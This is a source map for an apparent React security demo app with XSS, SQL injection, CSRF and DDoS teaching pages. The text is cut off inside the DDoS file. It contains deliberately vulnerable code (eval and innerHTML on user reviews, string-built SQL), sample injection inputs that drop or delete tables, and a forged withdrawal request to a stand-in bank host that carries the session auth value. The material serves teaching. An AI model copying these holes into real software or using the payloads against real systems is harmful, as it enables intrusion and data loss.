{"version":3,"sources":["pages/XSS/XSS.js","utils/utils.js","pages/SQLInject/db.js","pages/SQLInject/SQLInject.js","pages/SQLInject/codes.js","pages/CSRF/CSRF.js","pages/DDoS/DDoS.js","pages/DDoS/serverConsole.js","App.js","serviceWorker.js","index.js","pages/XSS/db.js","pages/XSS/codes.js"],"names":["Search","Input","XSS","props","_this","Object","_Users_home_workspace_current_security_demo_node_modules_babel_preset_react_app_node_modules_babel_runtime_helpers_esm_classCallCheck__WEBPACK_IMPORTED_MODULE_1__","this","_Users_home_workspace_current_security_demo_node_modules_babel_preset_react_app_node_modules_babel_runtime_helpers_esm_possibleConstructorReturn__WEBPACK_IMPORTED_MODULE_3__","_Users_home_workspace_current_security_demo_node_modules_babel_preset_react_app_node_modules_babel_runtime_helpers_esm_getPrototypeOf__WEBPACK_IMPORTED_MODULE_4__","call","onAddReview","review","db","state","newDB","concat","_Users_home_workspace_current_security_demo_node_modules_babel_preset_react_app_node_modules_babel_runtime_helpers_esm_toConsumableArray__WEBPACK_IMPORTED_MODULE_0__","key","length","id","content","localStorage","setItem","JSON","stringify","setState","updateReviewList","reviewList","document","querySelector","innerHTML","forEach","reviewItem","indexOf","code","replace","eval","e","console","log","liItem","createElement","appendChild","getFrontendCodes","html","defaultDB","getItem","parse","highlight","prevProps","prevState","snapshot","react__WEBPACK_IMPORTED_MODULE_6___default","a","style","textAlign","antd__WEBPACK_IMPORTED_MODULE_8__","gutter","type","justify","antd__WEBPACK_IMPORTED_MODULE_9__","span","antd__WEBPACK_IMPORTED_MODULE_10__","placeholder","onSearch","enterButton","className","alertCode","outsideCode","stealCookie","antd__WEBPACK_IMPORTED_MODULE_11__","dataSource","columns","Component","__webpack_require__","d","__webpack_exports__","highlight_js__WEBPACK_IMPORTED_MODULE_0__","highlight_js__WEBPACK_IMPORTED_MODULE_0___default","n","querySelectorAll","codePad","hljs","highlightBlock","name","age","title","dataIndex","SQLInject","classCallCheck","possibleConstructorReturn","getPrototypeOf","onAttackSearch","value","addLogs","keyword","logs","sql","toConsumableArray","_this$state","react_default","row","col","divider","table","map","CSRF","onClickEvil","auth","sessionStorage","axios","get","openNotification","Date","now","btn","es_button","onClick","notification","open","message","description","onLogin","account","password","isLogin","error","_this2","es_form","Item","input","prefix","icon","onChange","event","target","block","DDoS","startAttack","timeId","setInterval","isOpen","stopAttack","window","clearInterval","getRandomByte","Math","round","random","getRandomPort","getRandomIp","fin","padEnd","disabled","App","current","onChangeMenu","react_router_dom","menu","selectedKeys","mode","to","react_router","path","exact","component","Boolean","location","hostname","match","ReactDOM","render","src_App_0","getElementById","navigator","serviceWorker","ready","then","registration","unregister"],"mappings":"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","file":"static/js/main.93df37d2.chunk.js","sourcesContent":["import React, {Component} from 'react'\nimport {Col, Divider, Input, Row, Table} from \"antd\"\nimport {columns, defaultDB} from './db'\nimport {alertCode, outsideCode, stealCookie} from \"./codes\"\nimport {highlight} from \"../../utils/utils\"\n\nconst Search = Input.Search\n\nclass XSS extends Component {\n    constructor(props) {\n        super(props)\n        this.state = { db: defaultDB }\n    }\n\n    componentDidMount() {\n        let db = localStorage.getItem(\"db\")\n        if (!db) {\n            db = defaultDB\n            localStorage.setItem('db', JSON.stringify(db))\n        }\n        this.setState({ db: JSON.parse(db) })\n        this.updateReviewList()\n        highlight()\n    }\n\n    componentDidUpdate(prevProps, prevState, snapshot) {\n        this.updateReviewList()\n        highlight()\n    }\n\n    onAddReview = (review) => {\n        const {db} = this.state\n        const newDB = [...db, {\n                key: db.length + 1,\n                id: db.length + 1,\n                content: review\n        }]\n        localStorage.setItem('db', JSON.stringify(newDB))\n        this.setState({\n            db: newDB\n        })\n    }\n\n    updateReviewList = () => {\n        const {db} = this.state\n        const reviewList = document.querySelector('#review-list')\n        reviewList.innerHTML = ''\n\n        db.forEach(reviewItem => {\n            // Execute evil codes\n            try {\n                if (reviewItem.content.indexOf('script') > 0) {\n                    let code = reviewItem.content.replace('<script>', '').replace('</script>', '')\n                    eval(code)\n                }\n            }\n            catch (e) {\n                console.log('Error', e)\n            }\n            const liItem = document.createElement('li')\n            liItem.innerHTML = reviewItem.content\n\n            reviewList.appendChild(liItem)\n        })\n    }\n\n    getFrontendCodes = () => {\n        let html = `<ul>\\n`\n        this.state.db.forEach(reviewItem => html += `    <li>${reviewItem.content}</li>\\n`)\n        html += '</ul>'\n        return html\n    }\n\n    render() {\n        const {db} = this.state\n        return (\n            <div>\n                <h1 style={{textAlign: 'center'}}>Review Module (XSS Attack)</h1>\n                <Row gutter={16} type=\"flex\" justify=\"center\">\n                    {/*Left*/}\n                    <Col span={8}>\n                        <Divider>Frontend</Divider>\n                        <h3>Review List</h3>\n                        {/*Add review input*/}\n                        <Search\n                            placeholder=\"Enter a movie review\"\n                            onSearch={this.onAddReview}\n                            enterButton=\"Add Review\"\n                        />\n\n                        {/*Review list*/}\n                        <ul id=\"review-list\"/>\n\n                        {/*Frontend Codes*/}\n                        <Divider>Frontend Codes</Divider>\n                        <pre>\n                            <code className=\"html\">\n                                {this.getFrontendCodes()}\n                            </code>\n                        </pre>\n\n                        {/*Tips*/}\n                        <Divider>Tips</Divider>\n                        <p>Try following keyword to break the frontend</p>\n                        <ul>\n                            <li>{alertCode}</li>\n                            <li>{outsideCode}</li>\n                            <li>{stealCookie}</li>\n                        </ul>\n                    </Col>\n                    {/*Right*/}\n                    <Col span={8}>\n                        <Divider>Backend: 'review' Database</Divider>\n                        <Table dataSource={db} columns={columns}/>\n                    </Col>\n                </Row>\n            </div>\n        )\n    }\n}\n\nexport default XSS\n","import hljs from 'highlight.js'\n\nexport const highlight = () => {\n    const codePads = document.querySelectorAll('pre code')\n    codePads.forEach(codePad => hljs.highlightBlock(codePad))\n}\n","export const defaultDB = [{\n    key: '1',\n    name: 'Jack',\n    age: 32,\n}, {\n    key: '2',\n    name: 'Tom',\n    age: 42,\n}, {\n    key: '3',\n    name: 'Jerry',\n    age: 12,\n}]\n\nexport const columns = [{\n    title: 'user_name',\n    dataIndex: 'name',\n    key: 'name',\n}, {\n    title: 'user_age',\n    dataIndex: 'age',\n    key: 'age',\n}];\n","import React, {Component} from 'react'\nimport {Col, Divider, Input, Row, Table} from 'antd'\nimport {columns, defaultDB} from \"./db\"\nimport {readySqlCodes} from \"./codes\"\nimport './styles.css'\nimport {highlight} from \"../../utils/utils\"\n\nconst Search = Input.Search\n\nclass SQLInject extends Component {\n    constructor(props) {\n        super(props)\n        this.state = {\n            logs: [],\n            db: null\n        }\n    }\n\n    componentDidMount() {\n        let db = localStorage.getItem('sqlInjectDB')\n        if (!db) {\n            db = defaultDB\n            localStorage.setItem('sqlInjectDB', JSON.stringify(db))\n        }\n        this.setState({ db: JSON.parse(db) })\n        highlight()\n    }\n\n    componentDidUpdate(prevProps, prevState, snapshot) {\n        highlight()\n    }\n\n    onAttackSearch = (value) => {\n        this.addLogs(value)\n    }\n\n    addLogs = (keyword) => {\n        const {logs} = this.state\n        const sql = `\nselect * from user where user_name = '${keyword}'`\n        // Drop database\n        if (keyword.indexOf('drop') > 0 || keyword.indexOf('delete') > 0) {\n            this.setState({\n                logs: [ ...logs, sql],\n                db: []\n            })\n            localStorage.setItem('sqlInjectDB', '[]')\n        }\n\n        // Normal\n        this.setState({\n            logs: [ ...logs, sql]\n        })\n    }\n\n    render() {\n        const {logs, db} = this.state\n        return (\n          <div>\n              <h1 style={{textAlign: 'center'}}>User Module (SQL Inject Attack)</h1>\n              <Row gutter={16} type=\"flex\" justify=\"center\">\n                  {/*Left*/}\n                  <Col span={8}>\n                      <Divider>Frontend</Divider>\n                      <h3>Enter user name for searching user</h3>\n                      <Search\n                        placeholder=\"Enter user name\"\n                        onSearch={this.onAttackSearch}\n                        enterButton=\"Search User\"\n                      />\n                      <Divider>Tips</Divider>\n                      <p>Try following keyword to break the database</p>\n                      <ul>\n                          <li>'; drop database 'user</li>\n                          <li>'; delete user where '1' = '1</li>\n                      </ul>\n                  </Col>\n                  {/*Right*/}\n                  <Col span={8}>\n                      <Divider>Backend: 'user' Database</Divider>\n                      <Table dataSource={db} columns={columns}/>\n                      <Divider>SQL Logger</Divider>\n                      <pre>\n                        <code className=\"sql\">\n                            {readySqlCodes}\n                            {logs.map(log => `\\n${log}`)}\n                        </code>\n                    </pre>\n                  </Col>\n              </Row>\n          </div>\n        )\n    }\n}\n\nexport default SQLInject\n","export const readySqlCodes = `Loading Database...\nData base loaded...\n\nEnter user name to make a query...`\n","import React, {Component} from 'react'\nimport axios from 'axios'\nimport {Button, Col, Divider, Form, Icon, Input, notification, Row, message} from \"antd\"\n\nclass CSRF extends Component {\n    constructor(props) {\n        super(props)\n        this.state = {\n            isLogin: false,\n            account: '',\n            password: ''\n        }\n    }\n\n    onClickEvil = () => {\n        const auth = sessionStorage.getItem('auth')\n        axios.get(`http://bank.example/withdraw?account=Bob&amount=1000000&for=Evil&auth=${auth}`)\n    }\n\n    openNotification = () => {\n        const key = `open${Date.now()}`\n        const btn = (\n            <Button onClick={this.onClickEvil}>Click me</Button>\n        )\n        notification.open({\n            message: 'Hacker Message',\n            description: 'Click the link below to see something new XD',\n            btn,\n            key,\n        })\n    }\n\n    onLogin = () => {\n        if (this.state.account !== 'Bob' || this.state.password !== '123') {\n            message.error(\"Invalid account or password\")\n            return\n        }\n\n        this.setState({\n            isLogin: true\n        })\n\n        sessionStorage.setItem('auth', 'true')\n\n        this.openNotification()\n    }\n\n    render() {\n        const {isLogin, account, password} = this.state\n        return (\n            <div>\n                <h1 style={{textAlign: 'center'}}>Login Module (CSRF Attack)</h1>\n                <Row gutter={16} type=\"flex\" justify=\"center\">\n                    {/*Left*/}\n                    <Col span={8}>\n                        <Divider>Frontend</Divider>\n                        <h3>Review List</h3>\n                        {\n                            isLogin ?\n                                <div>You are logged in</div>\n                                :\n                                <Form className=\"login-form\">\n                                    <Form.Item>\n                                        <Input\n                                            value={account}\n                                            prefix={<Icon type=\"user\"/>}\n                                            placeholder=\"Bob is the account\"\n                                            onChange={event => this.setState({account: event.target.value})}\n                                        />\n                                    </Form.Item>\n                                    <Form.Item>\n                                        <Input\n                                            value={password}\n                                            prefix={<Icon type=\"lock\"/>}\n                                            type=\"password\"\n                                            placeholder=\"123 is the password\"\n                                            onChange={event => this.setState({password: event.target.value})}\n                                        />\n                                    </Form.Item>\n                                    <Form.Item>\n                                        <Button onClick={this.onLogin} type=\"primary\" block\n                                                className=\"login-form-button\">\n                                            Log in\n                                        </Button>\n                                    </Form.Item>\n                                </Form>\n                        }\n\n                        {/*Tips*/}\n                        <Divider>Tips</Divider>\n                        <p>Try following keyword to break the frontend</p>\n                        <ol>\n                            <li>Login with any email and password</li>\n                            <li>Click the link that user sends</li>\n                            <li>Boom, your account has been stolen 300 bucks</li>\n                        </ol>\n                    </Col>\n                </Row>\n            </div>\n        )\n    }\n}\n\nexport default CSRF\n","import React, {Component} from \"react\"\nimport {readyServerCodes} from \"./serverConsole\"\nimport {Button, Col, Divider, Row} from \"antd\"\nimport {highlight} from \"../../utils/utils\"\n\n\nclass DDoS extends Component {\n    constructor(props) {\n        super(props)\n        this.state = {\n            isOpen: false,\n            timeId: 0,\n            logs: []\n        }\n    }\n\n    componentDidMount() {\n        highlight()\n    }\n\n    startAttack = () => {\n        const timeId = setInterval(() => {\n                this.addLogs()\n        }, 1000)\n        this.setState({ timeId, isOpen: true })\n    }\n\n    stopAttack = () => {\n        window.clearInterval(this.state.timeId)\n        this.setState({ isOpen: false })\n    }\n\n    getRandomByte = () => {\n        return Math.round(Math.random()*256)\n    }\n\n    getRandomPort = () => {\n        return Math.round(Math.random()*50000) + 3000\n    }\n\n    getRandomIp = () => {\n        var ip = this.getRandomByte() +'.' +\n            this.getRandomByte() +'.' +\n            this.getRandomByte() +'.' +\n            this.getRandomByte()\n        return 